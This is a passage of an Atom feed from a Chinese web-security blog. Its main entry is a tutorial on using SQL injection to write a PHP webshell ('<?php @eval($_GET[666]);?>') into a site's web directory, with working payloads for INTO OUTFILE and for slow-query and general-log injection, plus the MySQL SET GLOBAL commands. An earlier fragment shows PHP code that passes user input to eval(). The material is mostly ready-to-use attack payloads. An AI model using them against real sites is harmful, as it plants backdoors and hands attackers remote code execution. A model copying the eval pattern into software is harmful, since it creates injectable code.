    <summary type="html">&lt;h2 id=&quot;代码执行&quot;&gt;&lt;a href=&quot;#代码执行&quot; class=&quot;headerlink&quot; title=&quot;代码执行&quot;&gt;&lt;/a&gt;代码执行&lt;/h2&gt;&lt;h3 id=&quot;eval&quot;&gt;&lt;a href=&quot;#eval&quot; class=&quot;headerlink&quot; title=&quot;eval&quot;&gt;&lt;/a&gt;eval&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;&#92;$ret = strtolower(&amp;#x27;&lt;span class=&quot;subst&quot;&gt;$data&lt;/span&gt;&amp;#x27;);&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$ret&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://blog.sunian.link/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="标签" scheme="https://blog.sunian.link/tags/%E6%A0%87%E7%AD%BE/"/>
    
  </entry>
  
  <entry>
    <title>sql 写入webshell</title>
    <link href="https://blog.sunian.link/2023/07/25/sqlshell/"/>
    <id>https://blog.sunian.link/2023/07/25/sqlshell/</id>
    <published>2023-07-25T07:01:07.000Z</published>
    <updated>2023-07-30T06:53:25.326Z</updated>
    
    <content type="html"><![CDATA[<p>如现在网站 URL 为 <a href="http://www.a.com/b.php?id=">http://www.a.com/b.php?id=</a> </p><h3 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h3><p>into outfile 语句是SQL 数据库的一个文件写入关键字 </p><p>使用条件:</p><ol><li>知道web目录的绝对路径 </li><li>对web目录有写入权限(一般root都拥有这个权限)</li><li>my.ini 配置文件中 secure_file_priv 必须为空不为 NULL ,也不为其他路径</li><li>要拥有root权限 </li><li>全局未开启gpc</li></ol><p>payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &quot;&lt;?php @eval($_GET[666]);?&gt;&quot;,2,3 into outfile &#x27;E:/phpStudy/PHPTutorial/WWW/shellc.php&#x27;--+</span><br></pre></td></tr></table></figure><h3 id="慢日志注入写shell"><a href="#慢日志注入写shell" class="headerlink" title="慢日志注入写shell"></a>慢日志注入写shell</h3><p>MYSQL 慢日志, 即: 当一句SQL语句的执行时间超过了所设定的时间,就会把这条语句保存到指定日志文件</p><p>查看慢日志配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;; </span><br></pre></td></tr></table></figure><p>开启慢日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log = on; </span><br></pre></td></tr></table></figure><p>设置超时时间为10秒 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set long_query_time = 10;</span><br></pre></td></tr></table></figure><p>设置慢日志文件保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log_file = &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\shella.php&#x27;; </span><br></pre></td></tr></table></figure><p>payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &#x27;&lt;?php @eval($_GET[666])?&gt;&#x27;,2,3 and sleep(12)--+ </span><br></pre></td></tr></table></figure><p>最后成功将shell 写入日志</p><h3 id="全局日志写shell"><a href="#全局日志写shell" class="headerlink" title="全局日志写shell"></a>全局日志写shell</h3><p>全局日志: 即: 每一条SQL的执行都被被记录 </p><p>查看全局日志配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;  </span><br></pre></td></tr></table></figure><p>开启全局日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on; </span><br></pre></td></tr></table></figure><p>设置全局日志文件保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file = &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\shellb.php&#x27;;  </span><br></pre></td></tr></table></figure><p>payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &#x27;&lt;?php @eval($_GET[666])?&gt;&#x27;,2,3--+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如现在网站 URL 为 &lt;a href=&quot;http://www.a.com/b.php?id=&quot;&gt;http://www.a.com/b.php?id=&lt;/a&gt; &lt;/p&gt;
&lt;h3 id=&quot;into-outfile写shell&quot;&gt;&lt;a href=&quot;#into-outfile写s</summary>
      
    
    
    
    <category term="web安全" scheme="https://blog.sunian.link/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="shell" scheme="https://blog.sunian.link/tags/shell/"/>
    
  </entry>
  
</feed>
